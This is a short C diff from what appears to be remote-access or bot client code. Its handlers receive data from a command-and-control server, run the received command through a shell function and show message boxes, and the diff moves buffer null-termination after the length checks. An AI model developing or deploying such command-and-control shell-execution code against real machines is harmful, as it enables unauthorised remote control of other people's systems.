@@ -65,12 +65,12 @@ void handle_shell()
         return;
     }
     ret = recv_from_cnc(cmd.cmd, cmd.cmd_len);
-    cmd.cmd[cmd.cmd_len] = 0;
     if (ret != cmd.cmd_len)
     {
         log_error("Received invalid command.");
         return;
     }
+    cmd.cmd[cmd.cmd_len] = 0;
     log_info("Command: \"%s\"", cmd.cmd);
     shell(&cmd);
     free(cmd.cmd);
@@ -105,12 +105,12 @@ void handle_msgbox()
         return;
     }
     ret = recv_from_cnc(cmd.title, cmd.title_len);
-    cmd.title[cmd.title_len] = 0;
     if (ret != cmd.title_len)
     {
         log_error("Received invalid title.");
         return;
     }
+    cmd.title[cmd.title_len] = 0;
 
     ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
     if (ret != sizeof(cmd.text_len))
@@ -125,12 +125,12 @@ void handle_msgbox()
         return;
     }
     ret = recv_from_cnc(cmd.text, cmd.text_len);
-    cmd.text[cmd.text_len] = 0;
     if (ret != cmd.text_len)
     {
         log_error("Received invalid text.");
         return;
     }
+    cmd.text[cmd.text_len] = 0;
 
     log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
     MessageBox(NULL, cmd.text, cmd.title, MB_OK);
